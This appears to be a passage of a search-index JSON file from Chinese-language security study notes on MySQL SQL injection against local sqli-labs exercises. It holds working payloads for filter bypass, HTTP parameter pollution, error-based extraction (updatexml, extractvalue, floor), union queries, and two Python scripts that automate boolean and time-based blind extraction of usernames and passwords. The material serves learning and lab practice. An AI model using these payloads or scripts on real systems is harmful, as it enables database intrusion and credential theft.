\uff0c\u4e5f\u5c31\u662f %2522 \u5728Sqlmap\u4e2d\uff0c\u5bf9payload\u8fdb\u884cURL\u7f16\u7801\u7684\u811a\u672c\u662f\uff1acharencode.py(URL\u7f16\u7801) \u3001chardoubleencode.py(\u4e24\u6b21URL\u7f16\u7801) \u8fc7\u6ee4\u4e86\u9017\u53f7 \u00b6 \u7b80\u5355\u6ce8\u5165\u53ef\u4ee5\u4f7f\u7528**join\u65b9\u6cd5**\u7ed5\u8fc7 union select 1,2,3 union select * from (select 1)a join (select 2)b join (select 3) \u5bf9\u4e8esubstr\u3001substring() \u548c mid() \u8fd9\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528**from for**\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7 // substr() \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 and (select ascii(substr(username,2,1)) from admin limit 1)>97; select * from test where id=1 and (select ascii(substr(username from 2 for 1))from admin limit 1)>97; // substring() \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 and (select ascii(substring(username,2,1)) from admin limit 1)>97; select * from test where id=1 and (select ascii(substring(username from 2 for 1))from admin limit 1)>97; // mid() \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 and (select ascii(mid(username,2,1)) from admin limit 1)>97; select * from test where id=1 and (select ascii(mid(username from 2 for 1))from admin limit 1)>97; \u5bf9\u4e8elimit \uff0c\u53ef\u4ee5\u7528 offset \u7ed5\u8fc7 // limit \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 limit 1,2; select * from test where id=1 limit 2 offset 1; \u8fc7\u6ee4\u4e86\u6bd4\u8f83\u7b26< > \u00b6 \u4f7f\u7528\u5230 **greatest()\u548cleast()**\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002greatest()\u8fd4\u56de\u6700\u5927\u503c\uff0cleast()\u8fd4\u56de\u6700\u5c0f\u503c select * from users where id=1 and ascii(substring(database(),0,1))>64; select * from users where id=1 and greatest(ascii(substring(database(),0,1)),64)>64; select * from users where id=1 and ascii(substring(database(),0,1))<64; select * from users where id=1 and least(ascii(substring(database(),0,1)),64)<64; \u5728Sqlmap\u4e2d\uff0c\u7528greatest\u4ee3\u66ff\u5927\u4e8e\u53f7\u7684\u811a\u672c\u662f\uff1agreatest.py \u4f7f\u7528**strcmp(str1,str2)**\u7ed5\u8fc7\uff1a\u5f53str1=str2\uff0c\u8fd4\u56de0\uff0c\u5f53str1>str2\uff0c\u8fd4\u56de1\uff0c\u5f53str1<str2\uff0c\u8fd4\u56de-1 \u4f7f\u7528**in\u64cd\u4f5c\u7b26**\u7ed5\u8fc7\uff1a \u4f7f\u7528**between and**\u6765\u7ed5\u8fc7\uff1a\u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u7684\u6570\u636e\u8303\u56f4\u3002\u8fd9\u4e9b\u503c\u53ef\u4ee5\u662f\u6570\u503c\u3001\u6587\u672c\u6216\u8005\u65e5\u671f \u8fc7\u6ee4\u4e86 or and xor not \u00b6 and\u7528 && \u4ee3\u66ff or\u7528 || \u4ee3\u66ff xor\u7528 | \u4ee3\u66ff not\u7528 ! \u4ee3\u66ff select * from users where id=1 and 1=2; select * from users where id=1 && 1=2\uff1b select * from users where id=1 or 1=2; select * from users where id=1 || 1=2; \u8fc7\u6ee4\u4e86\u6ce8\u91ca\u7b26 \u00b6 \u5982\u679c\u8fc7\u6ee4\u4e86#\uff0c\u5219\u53ef\u4ee5\u5229\u7528 ||' \u6765\u7ed5\u8fc7\u3002\u4f46\u662f\u8fd9\u4e2a\u53ea\u9650\u4e8e\u95ed\u5408\u540e\u9762\u662f\u5355\u5f15\u53f7\u8fd9\u79cd\u60c5\u5f62 select * from users where id='1' and 1=1#' limit 0,1 select * from users where id='1' and 1=1||'' limit 0,1 \u5982\u679c\u662f\u6570\u5b57\u578b\u6ce8\u5165\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5c31\u4e0d\u594f\u6548 \u6216\u8005\u662f**\u653e\u5f03\u6ce8\u91ca\u540e\u9762\u5185\u5bb9**\uff0c\u624b\u52a8\u62fc\u63a5 -1' union select 1,2,3 and '1'='1 SELECT * FROM users WHERE id='-1' union select 1,2,3 and '1'='1' LIMIT 0,1 \u8fc7\u6ee4\u4e86= \u00b6 \u4f7f\u7528 like\u3001rlike\u3001regexp like\uff1a\u5c31\u662f\u7b49\u4e8e\u7684\u610f\u601d rlike\uff1a\u5c31\u662f**\u91cc\u9762\u5305\u542b**\u6709\u8fd9\u4e2a regexp\uff1a\u548crlike\u4e00\u6837\uff0c**\u91cc\u9762\u5305\u542b**\u6709\u5373\u53ef \u5728Sqlmap\u4e2d\uff0c\u7528like\u4ee3\u66ff=\u53f7\u7684\u811a\u672c\u662f\uff1aequaltolike.py HTTP\u53c2\u6570\u6c61\u67d3\u7ed5\u8fc7 \u00b6 \u4ee3\u7801\u53ea\u9a8c\u8bc1\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570id\u7684\u5408\u6cd5\u6027 \u4f46\u662f $_GET \u662f\u4ece\u540e\u5f80\u524d\u53d6\u503c\u7684\uff0c $_GET['id'] \u662f\u53d6GET\u4f20\u9012\u7684**\u6700\u540e\u4e00\u4e2a**\u540d\u79f0\u4e3aid\u7684\u503c http://localhost/sqli/Less-29/login.php?id=1&id=-1' union select 1,2,3 -- - \u7b2c\u4e8c\u4e2aid\u53c2\u6570\u901a\u8fc7 $_GET \u4f20\u9012\u9020\u6210sql\u6ce8\u5165","title":"SQL\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#sql","text":"","title":"SQL\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#sql_1","text":"mysql\u5185\u7f6e\u7684information_schema\u6570\u636e\u5e93\u4e2d\u6709\u4e09\u4e2a\u8868\u975e\u5e38\u91cd\u8981 schemata:\u8868\u91cc\u5305\u542b\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 tables\uff1a\u8868\u91cc\u5305\u542b\u6240\u6709\u6570\u636e\u5e93\u7684\u6240\u6709\u7684\u8868\uff0c\u9ed8\u8ba4\u5b57\u6bb5\u4e3atable_name columns:\u4e09\u4e2a\u5217\u975e\u5e38\u91cd\u8981 TABLE_SCHEMA\uff1a\u6570\u636e\u5e93\u540d TABLE_NAME:\u8868\u540d COLUMN_NAME:\u5b57\u6bb5\u540d PHP\u7684\u5305\u542b\u6587\u4ef6\u51fd\u6570\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u662f**include**\u548c**require**\u3002 require\u751f\u6210\u4e00\u4e2a\u81f4\u547d\u9519\u8bef\uff08E_COMPILE_ERROR\uff09\uff0c\u5728\u9519\u8bef\u53d1\u751f\u540e\u811a\u672c\u4f1a\u505c\u6b62\u6267\u884c\u3002 include\u751f\u6210\u4e00\u4e2a\u8b66\u544a\uff08E_WARNING\uff09\uff0c\u5728\u9519\u8bef\u53d1\u751f\u540e\u811a\u672c\u4f1a\u7ee7\u7eed\u6267\u884c\u3002 @\u662f\u53ef\u4ee5**\u5c4f\u853d**\u51fd\u6570\u6267\u884c\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\u800c\u4ea7\u751f\u7684\u4e00\u4e9b\u9519\u8bef\u3001 \u8b66\u544a\u4fe1\u606f \uff0c\u8fd9\u6837\u7528\u6237\u5c31\u770b\u4e0d\u5230\u7a0b\u5e8f\u7684\u51fa\u9519\u4fe1\u606f\u3002\u8fd9\u6837\u9664\u4e86\u7528\u6237\u754c\u9762\u4f1a\u53cb\u597d\u4e00\u4e9b\u5916\uff0c\u66f4\u91cd\u8981\u7684\u662f\u5b89\u5168\u6027\uff0c\u56e0\u4e3a\u5c4f\u853d\u4e86**\u51fa\u9519\u6587\u4ef6\u7684\u8def\u5f84**\u7b49\u4fe1\u606f\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u7528\u6237\u4e0d\u5e94\u8be5\u770b\u5230\u540e\u7aef\u4efb\u4f55\u5176\u4ed6\u4fe1\u606f\u3002 die() \u51fd\u6570\u8f93\u51fa\u4e00\u6761\u6d88\u606f\uff0c\u5e76\u9000\u51fa\u5f53\u524d\u811a\u672c\u3002 \u62fc\u63a5sql $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; \u6211\u4eec\u5224\u65ad\u662f\u5426\u6709\u6ce8\u5165\u70b9\u4e00\u822c\u662f\u901a\u8fc7\u4e09\u4e2a\u65b9\u9762\uff0c\u5982\u679c\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u70b9\uff0c\u57fa\u672c\u53ef\u4ee5\u65ad\u5b9a\u5b58\u5728\u6ce8\u5165\u70b9 id=1' \u52a0\u5355\u5f15\u53f7\u62a5\u9519\uff0c\u8fd9\u91cc\u7684\u5355\u5f15\u53f7\uff0c\u662f\u6cdb\u6307\uff0c\u6cdb\u6307\u7279\u6b8a\u7b26\u53f7\uff0c\u56e0\u4e3aSQL\u9690\u5f0f\u8f6c\u6362\u7684\u539f\u56e0\uff0c\u4e00\u822c\u662f\u52a0\u95ed\u5408\u7b26\u53f7\u4f7f\u5176\u62a5\u9519 id=1 and 1=1 \u8fd4\u56de\u6b63\u786e\u7ed3\u679c\uff0c\u8fd9\u91cc1=1\u4e5f\u662f\u6cdb\u6307\uff0c\u6cdb\u6307\u52a0\u5165true\u7684\u67e5\u8be2\u8bed\u53e5\u4f1a\u4e0d\u4f1a\u6267\u884c id=1 and 1=2 \u8fd4\u56de\u9519\u8bef\uff0c\u8fd9\u91cc1=2\u4e5f\u662f\u6cdb\u6307\uff0c\u6cdb\u6307\u52a0\u5165false\u7684\u67e5\u8be2\u8bed\u53e5\u4f1a\u4e0d\u4f1a\u6267\u884c MySQL\u7684 \u9690\u5f0f\u8f6c\u6362 \uff1a \u82e5\u5b57\u7b26\u4e32\u662f\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u5e76\u4e14\u5168\u90e8\u90fd\u662f\u6570\u5b57\uff0c\u5219\u8f6c\u6362\u7684\u6570\u5b57\u7ed3\u679c\u662f\u6574\u4e2a\u5b57\u7b26\u4e32\uff1b\u90e8\u5206\u662f\u6570\u5b57\uff0c\u5219\u8f6c\u6362\u7684\u6570\u5b57\u7ed3\u679c\u662f\u622a\u6b62\u5230\u7b2c\u4e00\u4e2a\u4e0d\u662f\u6570\u5b57\u7684\u5b57\u7b26\u4e3a\u6b62 \u82e5\u5b57\u7b26\u4e32\u4e0d\u662f\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u5219\u8f6c\u6362\u7684\u6570\u5b57\u7ed3\u679c\u662f 0 id\u5b57\u6bb5\u662fint\u7c7b\u578b\uff0c\u5728\u505awhere\u5224\u65ad\u65f6 1 and 1=1 \u4e0e 1 and 1=2 \u5747\u88ab\u8f6c\u6362\u4e3a\u6570\u5b57 1 \u4e86\uff0c\u6240\u4ee5\u624d\u4f1a\u663e\u793a\u6b63\u786e\u9875\u9762 MySQL\u7684**\u5e03\u5c14\u7c7b\u578b**\u8f6c\u6362 \u9690\u5f0f\u8f6c\u6362 \uff1a \u5f53\u8fd0\u7b97\u7b26\uff0c\u51fd\u6570\u6216\u8005\u6d41\u7a0b\u63a7\u5236\u7ed3\u6784\u9700\u8981\u4e00\u4e2a boolean \u53c2\u6570\u65f6\uff0c\u8be5\u503c\u4f1a\u88ab \u81ea\u52a8\u8f6c\u6362 \u22651 \u7684\u6570\u503c\u4f1a\u88ab\u8f6c\u6362\u6210 TRUE 0\u6216\u5176\u4ed6\u975e\u6570\u5b57\u5f00\u5934\u5b57\u7b26\u4e32 \u4f1a\u88ab\u8f6c\u6362\u6210 FALSE \u5c31\u50cf\u7b2c\u4e00\u5173\u7684 '2a' \u5148\u662f\u9690\u5f0f\u8f6c\u6362 \u4e3a \u6570\u5b572 \uff0c\u7136\u540e\u56e0\u4e3a\u4e0e\u5e03\u5c14\u7c7b\u578b\u8fd0\u7b97\uff0c\u53c8\u88ab\u8f6c\u6362\u4e3a TRUE \u540e\u9762\u7684\u5c31\u8ddf\u524d\u9762\u7684\u6d41\u7a0b\u4e00\u6837\uff0c\u53ea\u662f\u95ed\u5408\u662f ') preg_replace \u6b63\u5219\u5339\u914d\u4fee\u9970\u7b26 \uff1a i\uff1a\u641c\u7d22\u65f6\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff1aA\u548ca\u6ca1\u6709\u533a\u522b g\uff1a\u641c\u7d22\u65f6\u4f1a\u67e5\u627e\u6240\u6709\u7684\u5339\u914d\u9879,\u5982\u679c\u6ca1\u6709\u6807\u5fd7 g\uff0c\u5219\u6b63\u5219\u8868\u8fbe\u5f0f\u4ec5\u67e5\u627e\u7b2c\u4e00\u4e2a\u5339\u914d\u9879 m\uff1a\u591a\u884c\u6a21\u5f0f\uff0c\u8fd9\u4ec5\u4ec5\u4f1a\u5f71\u54cd ^ \u548c $ \u951a\u7b26\u7684\u884c\u4e3a\uff0c\u4e0d\u4ec5\u4ec5\u5339\u914d\u6587\u672c\u7684\u5f00\u59cb\u4e0e\u7ed3\u675f\uff0c\u8fd8\u5339\u914d\u6bcf\u4e00\u884c\u7684\u5f00\u59cb\u4e0e\u7ed3\u675f\u3002 ^ \u5339\u914d\u6587\u672c\u5f00\u5934\uff0c $ \u5339\u914d\u6587\u672c\u672b\u5c3e s\uff1a\u542f\u7528 \u201cdotall\u201d \u6a21\u5f0f\uff0c\u5141\u8bb8\u70b9 . \u5339\u914d\u6362\u884c\u7b26 \\n\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u70b9\u4e0e\u6362\u884c\u7b26 \\n \u4e0d\u5339\u914d\uff09","title":"Sql\u57fa\u7840"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_1","text":"","title":"\u5206\u7c7b"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_2","text":"GET\u578b POST\u578b User-Agent\u578b Referer\u578b Cookie\u578b","title":"\u57fa\u4e8e\u6ce8\u5165\u4f4d\u7f6e"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_3","text":"' ) \" \") ') ')) \")) \u6570\u503c\u578b\u65e0\u9700\u95ed\u5408","title":"\u57fa\u4e8e\u95ed\u5408\u65b9\u6cd5"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_4","text":"select\u8bed\u53e5 update\u8bed\u53e5 $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; \u5728\u66f4\u65b0passwd\u4e2d\u53ef\u4ee5\u6ce8\u5165 uname=admin&passwd=' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#&submit=Submit uname=admin&passwd=' and extractvalue(null,concat(0x7e,database(),0x7e))#&submit=Submit insert\u8bed\u53e5 $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; insert\u7c7b\u578b\u7684\u6ce8\u5165\u4e5f\u662f\u9700\u8981\u914d\u5408\u62a5\u9519\u51fd\u6570updatexml()\u3001extractvalue()\u3001floor()\u56de\u663e\u4fe1\u606f\uff0c\u4fdd\u8bc1\u95ed\u5408\u5373\u53ef\uff0c\u4e0d\u8fc7\u6b64\u5904\u7684\u6ce8\u5165\u70b9\u5728uagent\u5185 User-Agent: ',1,updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password) from users limit 0,1)),1))# INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('',1,updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password) from users limit 0,1)),1))#', '127.0.0.1', 1)","title":"\u57fa\u4e8e\u6ce8\u5165\u8bed\u53e5\u7c7b\u578b"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_5","text":"","title":"\u6ce8\u5165\u65b9\u6cd5\u603b\u7ed3"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_6","text":"\u6d4b\u8bd5\u53d1\u73b0\u662f\u5355\u5f15\u53f7\u95ed\u5408 $sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\"; \u76f4\u63a5\u4e0a\u8054\u5408\u67e5\u8be2 ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ \u7206\u8868\u540d ?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='8fof1zun81'--+ \u7206\u5217\u540d ?id=-1' union select 1,group_concat(secret_31F4),3 from 8fof1zun81--+ \u83b7\u53d6key\u503c","title":"\u8054\u5408\u67e5\u8be2"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_7","text":"\u4ee5php\u4e3a\u4f8b\uff0c\u9700\u8981\u6e90\u7801\u4ee3\u7801\u5f02\u5e38\u5904\u7406\u4e2d\u5b58\u5728\u6253\u5370\u9519\u8bef\u7684\u65b9\u6cd5 print_r(mysqli_error($con1)); \uff0c\u624d\u80fd\u5229\u7528\u62a5\u9519\u6ce8\u5165\u56de\u663e\u9519\u8bef\u7ed3\u679c","title":"\u62a5\u9519\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#updatexml","text":"UPDATEXML(XML_document,XPath_string,new_value); \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string\uff08Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff09 \u7b2c\u4e09\u4e2a\u53c2\u6570\uff1anew_value,String\u683c\u5f0f\uff0c\u66ff\u6362\u67e5\u627e\u5230\u7684\u7b26\u5408\u6761\u4ef6\u7684\u6570\u636e \u901a\u4fd7\u7684\u5c06\u5c31\u662f\u627e\u5230\u6570\u636e\u66ff\u6362\u6570\u636e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6211\u4eec\u662f\u7528\u4e0d\u5230\u7684\uff0c\u7528\u5230\u7684\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4e14\u662f\u4ed6\u7684\u62a5\u9519\u8fd4\u56de\u503c\u3002 http://localhost/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,version()),0) -- - SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,version()),0) -- -' LIMIT 0,1 \u5982\u679c\u4e0d\u52a0concat()\u7684\u8bdd\u62a5\u9519\u56de\u663e\u7ed3\u679c\u4e0d\u5168 payload\uff1a http://localhost/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password))from users),0x7e),10) -- - SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password))from users),0x7e),1) -- -' LIMIT 0,1 \u663e\u793a\u4e0d\u5168 \u53ef\u4ee5\u9010\u884c\u8f93\u51fa http://localhost/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1)),0) -- - SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1)),0) -- -' LIMIT 0,1","title":"updatexml()"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#extractvalue","text":"ExtractValue\uff08xml_document,xpath_string\uff09 \u4ece\u76ee\u6807XML\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u7684\u5b57\u7b26\u4e32 \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u540d\u79f0\uff0c\u6587\u4e2d\u4e3aDoc \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string\uff08Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff09 http://localhost/sqli/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1))) -- - SELECT * FROM users WHERE id='1' and extractvalue(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1))) -- -' LIMIT 0,1","title":"extractvalue()"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#floor","text":"\u6700\u7ec8payload\uff1a http://localhost/sqli/Less-5/?id=1' and (SELECT 1 from(select count(*),CONCAT(DATABASE(),floor(rand(0)*2))x from users group by x)a)-- - SELECT * FROM users WHERE id='1' and (select 1 from (select count(*) ,concat(database(),floor(rand(0)*2))x from users group by x)a) -- -' LIMIT 0,1 rand()\u4ea7\u751f0\u52301\u7684\u968f\u673a\u6570\uff0c rand(0) \u5185\u7684 0 \u662f\u79cd\u5b50\uff0c\u56fa\u5b9a\u79cd\u5b50\u4ea7\u751f\u7684\u968f\u673a\u6570\u90fd\u662f\u4e00\u6837\u7684 floor() \u51fd\u6570\u8fd4\u56de\u5c0f\u4e8e\u6216\u7b49\u4e8ex\u7684\u6700\u5927\u6574\u6570 floor(rand(0)*2) \u51fd\u6570\u5c31\u662f\u5c060\u52301\u7684\u968f\u673a\u6570\u4e58\u4ee52\u4e4b\u540e\u518d\u5411\u4e0b\u53d6\u6574 \u56e0\u4e3a\u79cd\u5b50\u56fa\u5b9a\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5e8f\u5217\u4e5f\u662f\u56fa\u5b9a\u7684011011\u2026 concat(database(),floor(rand(0)*2))x \u8fd9\u91cc\u662f\u5c06 concat(database(),floor(rand(0)*2)) \u53eb\u4e3a x \uff0c\u5c31\u662f\u8d77\u4e2a\u522b\u540d group by key\u5728\u6267\u884c\u65f6\u5faa\u73af\u8bfb\u53d6\u6570\u636e\u7684\u6bcf\u4e00\u884c\uff0c\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e8e**\u4e34\u65f6\u8868**\u4e2d\u3002\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684key\u65f6\uff0c\u5982\u679ckey\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u66f4\u65b0\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e \uff08\u66f4\u65b0\u65f6\uff0c\u4e0d\u518d\u8ba1\u7b97rand\u503c\uff09 \uff1b\u5982\u679c\u8be5key\u4e0d\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u5728\u4e34\u65f6\u8868\u4e2d\u63d2\u5165key\u6240\u5728\u884c\u7684\u6570\u636e\u3002 \uff08\u63d2\u5165\u6570\u636e\u65f6\uff0c\u4f1a\u518d\u8ba1\u7b97rand\u503c\uff09 \u7531\u4e8efloor(rand(0)*2)\u7684\u8ba1\u7b97\u7ed3\u679c01101100\u2026\uff0c\u5bfc\u81f4\u4e34\u65f6\u8868\u63d2\u5165\u65b0\u884c\u65f6\u4e3b\u952e\u51b2\u7a81 \u5c31\u4f1a\u7206\u51fa Duplicate entry 'security1' for key <group_key> and (select 1 from \u5fc5\u987b\u52a0\uff0c\u5426\u5219\u62a5\u51fa Operand should contain 1 column\uff08\u64cd\u4f5c\u6570\u5e94\u5305\u542b1\u5217\uff09 \uff0c\u56e0\u4e3aand\u540e\u9762\u7684\u8bed\u53e5\u751f\u6210\u7684\u662f\u4e00\u4e2a \u865a\u8868 \uff0c\u800c\u6211\u4eec\u9700\u8981\u7684\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06and\u540e\u9762\u67e5\u8be2\u6539\u4e3a\u5e03\u5c14\u503c\u3002","title":"floor()"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_8","text":"' \u95ed\u5408\u7684\u5e03\u5c14\u578b\u76f2\u6ce8 http://localhost/sqli/Less-8/?id=1' and ascii(substr(database(),1,1))=115 -- - SELECT * FROM users WHERE id='1' and ascii(substr(database(),1,1))=115 -- -' LIMIT 0,1 \u56de\u663e\u6b63\u5e38\u9875\u9762\u8bf4\u660eand\u540e\u9762\u4e3atrue ?id=1') and length((select database()))=10--+ \u5e03\u5c14\u76f2\u6ce8 substr(database(),1,1) \u610f\u601d\u662f\u622a\u53d6\u6570\u636e\u5e93\u540d\uff0c\u4ece\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5f00\u59cb\u622a\u53d6\u4e00\u4e2a\u5b57\u7b26 's' ascii() \u662f\u5c06\u5b57\u7b26\u8f6c\u6362\u4e3a ASCII\u7801 \uff0c 's' \u5bf9\u5e94\u7684ASCII\u7801\u662f 115 length() \u51fd\u6570\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 left() \u51fd\u6570\uff0c\u8fd4\u56de\u4ece\u5de6\u81f3\u53f3\u622a\u53d6\u56fa\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32 \u7136\u540e\u53ef\u4ee5\u76f4\u63a5\u4e0a\u811a\u672c\u6216\u8005sqlmap\u4e86 import string import requests from time import sleep arlist = string . printable Baseurl = \"http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1' and \" def checkurl ( url ): res = requests . get ( url ) if res . ok : if 'You are in' in res . text : return True return False def main (): flag = '' for g in range ( 100 ): for i in arlist : payload = \"substr((select group_concat(username,password) from users), %s ,1) = \\' %s \\' --+\" % ( g , i ) finalurl = Baseurl + payload if checkurl ( finalurl ): flag = flag + str ( i ) print ( flag ) sleep ( 0.2 ) if __name__ == \"__main__\" : main ()","title":"\u5e03\u5c14\u76f2\u6ce8"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_9","text":"\u4e0d\u7ba1\u662f\u6b63\u786e\u4e0e\u5426\uff0c\u9875\u9762\u90fd\u663e\u793a\u4e00\u6837\u7684\u5185\u5bb9\uff0c\u53ea\u80fd\u901a\u8fc7\u5ef6\u65f6\u6765\u89c2\u5bdf\u662f\u5426\u6267\u884c\u4e86sql\u8bed\u53e5 ?id=1') and if(length((select database()))=10,sleep(5),1)--+ \u65f6\u95f4\u6ce8\u5165\uff0c\u5982\u679c\u51fa\u73b0\u5ef6\u8fdf\u8868\u793a\u8be5\u6570\u636e\u5e93\u540d\u957f\u5ea6\u662f10 \u7136\u540e\u5c31\u662f\u4e0a\u811a\u672c\u6216\u8005sqlmap\u4e86 import string import requests from time import sleep arlist = string . printable Baseurl = \"http://127.0.0.1/sqlilabs2/Less-9/index.php?id=1' and \" def checkurl ( url ): try : res = requests . get ( url , timeout = 3 ) #\u5982\u679c\u6267\u884c\u4e86sleep\u8fd9\u91cc\u4f1a\u8d85\u65f6\u4ea7\u751f\u5f02\u5e38 return True except Exception as e : return False def main (): flag = '' for g in range ( 100 ): for i in arlist : payload = \"if((substr((select group_concat(username,password) from users), %s ,1) = \\' %s \\' ),sleep(5),1)--+\" % ( g , i ) finalurl = Baseurl + payload if checkurl ( finalurl ): flag = flag + str ( i ) print ( flag ) sleep ( 0.2 ) if __name__ == \"__main__\" : main ()","title":"\u65f6\u95f4\u76f2\u6ce8"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#sleep","text":"sleep(N) N\u4e3a\u6570\u503c\uff0c\u5355\u4f4d\u662f\u79d2\uff0c\u52a0\u4e0a\u6b64\u503c\uff0c\u67e5\u8be2\u8bed\u53e5\u4f1a\u7b49\u5f85N\u79d2\u6267\u884c 1' and if((substr(database(),1,1))='s',sleep(5),null)","title":"sleep()"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#benchmark","text":"benchmark(count,expr) count:\u8fd0\u884c\u6b21\u6570 expr:\u8fd0\u884c\u7684\u547d\u4ee4","title":"benchmark()"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_10","text":"information_schema\u6570\u636e\u5e93\u4e2d\u7684tables\u8868\u662f\u6574\u4e2aMySQL\u6570\u636e\u5e93\u8868\u540d\u7684\u6c47\u603b\u3002columns\u8868\u662f\u6574\u4e2aMySQL\u6570\u636e\u5e93\u5217\u7684\u6c47\u603b\u3002 \u53ef\u4ee5\u5229\u7528information_schema.tables\u548cinformation_schema.columns\u6765\u8fdb\u884c\u7b1b\u5361\u5c14\u7b97\u79ef\uff0c\u9020\u6210\u5927\u8d1f\u8377\u67e5\u8be2\uff0c\u4ee5\u81f3\u4e8e\u8fbe\u5230\u5ef6\u65f6\u7684\u6548\u679c\u3002 select * from users where id=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B); 0.44 